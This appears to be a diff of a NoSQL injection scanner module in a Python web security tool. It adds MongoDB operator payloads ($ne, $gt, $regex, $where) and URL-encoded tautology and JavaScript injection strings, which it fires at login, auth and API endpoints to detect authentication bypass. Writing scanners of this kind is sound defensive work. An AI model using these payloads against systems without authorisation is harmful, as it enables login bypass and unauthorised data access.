@@ -1,133 +1,151 @@
+
+import logging
 from typing import Any, Dict, List, Optional
 import requests
 import json
 import urllib.parse
-import time
-import logging
 from websecure.core.payloads import load_external_payloads
+
+# Smart context analysis
+try:
+    from websecure.core.input_analyzer import (
+        analyze_input_context, 
+        should_skip_payload_category,
+        format_analysis_log
+    )
+    _HAS_ANALYZER = True
+except ImportError:
+    _HAS_ANALYZER = False
 
 logger = logging.getLogger(__name__)
 
-# Payloads for NoSQL Injection
-# Focus on MongoDB mostly as it's the most common target
+# Basic NoSQL Payloads
+URL_PAYLOADS = [
+    ("' && this.password.match(/.*/)//+%00", "regex_bypass"),
+    ("'%20%7c%7c%20'a'%3d'a", "tautology"),
+    ("';return 'a'=='a' && ''=='", "tautology_js"),
+    ("%24where%3D%221%3D1%22", "where_clause"),
+    ("1', $or: [ {}, { 'a':'a", "or_injection")
+]
+
 NOSQL_PAYLOADS = [
-    # Auth bypass / Tautologies
-    ({"$ne": -1}, "ne_bypass"),
-    ({"$ne": 1}, "ne_bypass"),
+    ({"$ne": "-1"}, "neeq_bypass"),
     ({"$gt": ""}, "gt_bypass"),
     ({"$regex": ".*"}, "regex_bypass"),
+    ({"$where": "1==1"}, "where_bypass"),
+    ({"$exists": True}, "exists_bypass")
 ]
 
-# Error-based / Specific logic payloads (URL encoded)
-URL_PAYLOADS = [
-    ("'", "syntax_error"),
-    ('"', "syntax_error"),
-    ("|| 1==1", "logic_bypass"),
-    ("' && this.password.match(/.*/)//", "js_injection"), 
-    ("%27%20%26%26%20this.password.match(/.*/)//", "js_injection_encoded"),
-]
-
-# Load Custom Payloads
+# Load external payloads
 try:
-    _custom = load_external_payloads('nosqli')
-    for _p in _custom:
-        _p = _p.strip()
-        if not _p: continue
-        # Heuristic: JSON-like -> Body payload
-        if _p.startswith('{') and _p.endswith('}'):
-            try:
-                _j = json.loads(_p)
-                NOSQL_PAYLOADS.append((_j, "custom_body"))
-            except:
-                NOSQL_PAYLOADS.append((_p, "custom_body"))
-        else:
-            URL_PAYLOADS.append((_p, "custom_param"))
-except Exception as e:
-    logger.debug(f"Failed to load custom nosqli payloads: {e}")
+    _ext = load_external_payloads("nosqli")
+    if _ext:
+        # Convert string payloads to dummy tuples for URL_PAYLOADS compatibility
+        for p in _ext:
+            if isinstance(p, str):
+                URL_PAYLOADS.append((p, "external_wordlist"))
+                # Also try as JSON payload if it looks like JSON
+                if p.strip().startswith("{") and p.strip().endswith("}"):
+                    try:
+                        NOSQL_PAYLOADS.append((json.loads(p), "external_json"))
+                    except:
+                        pass
+except ImportError:
+    pass
 
-def run(url: str, session=None, debug: bool = False, auth_ctx=None) -> List[Dict[str, Any]]:
+def run_nosqli_scan(ctx):
     """
-    Checks for NoSQL Injection vulnerabilities by fuzzing URL parameters and JSON bodies.
+    Main entry point for NoSQLi scanner.
+    Iterates over discovered endpoints and fuzzes them.
     """
-    results = []
-    if not session:
-        session = requests.Session()
+    session = ctx.session
+    results = getattr(ctx, "results", {})
+    discovery = results.get("discovery", {})
+    
+    # 1. Collect targets
+    # Combine explicitly crawled endpoints and discovered parameter sources
+    endpoints = set(results.get("endpoints", []))
+    
+    # Also add URLs from discovery 'query' list if they are full URLs
+    if isinstance(discovery, dict):
+        for u in discovery.get("query", []):
+            if isinstance(u, str) and "://" in u:
+                endpoints.add(u)
+                
+    # Filter for interesting ones (params or json)
+    targets = list(endpoints)
+    print(f"[NoSQLi] Scanning {len(targets)} endpoints...")
+    
+    findings = []
+    
+    for url in targets:
+        if not isinstance(url, str): continue
+        if ctx.debug:
+            print(f"[NoSQLi] Testing {url}")
+            
+        # 1. GET Fuzzing
+        if "?" in url:
+             parsed = urllib.parse.urlparse(url)
+             qs = urllib.parse.parse_qs(parsed.query)
+             if qs:
+                 _fuzz_query_params(url, qs, session, findings)
 
-    parsed = urllib.parse.urlparse(url)
-    qs = urllib.parse.parse_qs(parsed.query)
+        # 2. JSON Body Fuzzing (Blind attempt on endpoints that look like APIs)
+        # Heuristic: if url ends in /login, /auth, /api, or similar
+        lower = url.lower()
+        if any(x in lower for x in ["api", "auth", "login", "signin", "user", "v1"]):
+            _fuzz_json_body(url, session, findings)
 
-    # 1. GET Parameter Fuzzing
-    # If the URL has query parameters, we fuzz them one by one.
-    if qs:
-        try:
-            _fuzz_query_params(url, qs, session, results)
-        except Exception as e:
-            logger.debug(f"NoSQLi GET error {url}: {e}")
-
-    # 2. JSON Body Fuzzing
-    # We attempt to send JSON payloads assuming the endpoint might accept POST with JSON.
-    try:
-        _fuzz_json_body(url, session, results)
-    except Exception as e:
-        logger.debug(f"NoSQLi JSON error {url}: {e}")
-
-    return results
+    # Allow custom add_result if available in context or global
+    if hasattr(ctx, "add_result") and callable(ctx.add_result):
+        for f in findings:
+            ctx.add_result("nosqli", f)
+    elif "nosqli" in results:
+        results["nosqli"].extend(findings)
+    else:
+        results["nosqli"] = findings
 
 def _fuzz_query_params(url: str, qs: dict, session, results: list):
     """
     Fuzzes GET parameters with NoSQL logic operators.
-    Note: Standard requests library URL encoding usually prevents passing raw dicts like ?arg[$ne]=1
-    unless we construct the query manually strictly.
     """
     base_url = url.split("?")[0]
     
-    # We verify vulnerability by checking for differences in response length/code 
-    # or specific error messages.
-    
-    # First, baseline
     try:
         base_resp = session.get(url, timeout=5)
     except requests.RequestException:
         return
 
-    # Basic error probing
     for payload_str, pay_type in URL_PAYLOADS:
-        # Inject into each param
         for param in qs:
-            # We must be careful to reconstruct the query with the injection
-            # Simply appending payload to the value
-            
-            # Construct dictionary
+            # Smart context check
+            if _HAS_ANALYZER:
+                ctx = analyze_input_context(name=param, source="param", url_path=base_url)
+                if should_skip_payload_category(ctx.context, "nosqli"):
+                    continue
+
             fuzzed_qs = qs.copy()
-            # If multivalued, take first and append
-            val = fuzzed_qs[param][0]
+            # If valid list, take first
+            val = fuzzed_qs[param][0] if fuzzed_qs[param] else ""
             fuzzed_qs[param] = val + payload_str
             
+            parsed = urllib.parse.urlparse(url)
+            new_query = urllib.parse.urlencode(fuzzed_qs, doseq=True)
+            target = urllib.parse.urlunparse(parsed._replace(query=new_query))
+            
             try:
-                # Re-encode
-                new_query = urllib.parse.urlencode(fuzzed_qs, doseq=True)
-                target = f"{base_url}?{new_query}"
-                
                 resp = session.get(target, timeout=5)
-                
                 if _is_suspicious(base_resp, resp):
                     results.append({
                         "type": "nosqli",
-                        "severity": "medium",
+                        "severity": "high",
                         "url": target,
-                        "method": "GET",
-                        "message": f"Potential NoSQL Injection (Error/diff): {pay_type}",
+                        "param": param,
                         "payload": payload_str,
-                        "evidence": {
-                            "request_url": target,
-                            "response_status": resp.status_code,
-                            "response_snippet": resp.text[:500] if resp.text else ""
-                        },
-                        "details": f"Parameter '{param}' with payload '{payload_str}' caused anomalous response."
+                        "evidence": "Response difference / Error detected"
                     })
             except:
                 pass
-
 
 def _fuzz_json_body(url: str, session, results: list):
     """
@@ -142,10 +160,18 @@ def _fuzz_json_body(url: str, session, results: list):
     except:
         return
 
-    # Operator Injection (MongoDB $ne, $gt, etc)
+    # Operator Injection
     for payload_obj, pay_type in NOSQL_PAYLOADS:
-        # Try injecting into 'user' and 'password' common fields
-        targets = ["username", "user", "email", "password", "pass", "id"]
+        default_targets = ["username", "user", "email", "password", "pass", "id"]
+        targets = []
+        
+        for t in default_targets:
+            if _HAS_ANALYZER:
+                ctx = analyze_input_context(name=t, source="json")
+                if not should_skip_payload_category(ctx.context, "nosqli"):
+                     targets.append(t)
+            else:
+                targets.append(t)
         
         for key in targets:
             attack_payload = base_payload.copy()
@@ -153,10 +179,6 @@ def _fuzz_json_body(url: str, session, results: list):
             
             try:
                 resp = session.post(url, json=attack_payload, timeout=5)
-                
-                # Heuristic:
-                # If baseline was 401/403 (login failed) and this is 200 (bypass)
-                # Or if response is significantly different (diff > threshold)
                 
                 if base_resp.status_code in (401, 403) and resp.status_code == 200:
                     results.append({
@@ -217,3 +239,6 @@ def _is_suspicious(base_resp, attack_resp) -> bool:
             return True
             
     return False
+
+# Alias for generic runners
+run = run_nosqli_scan
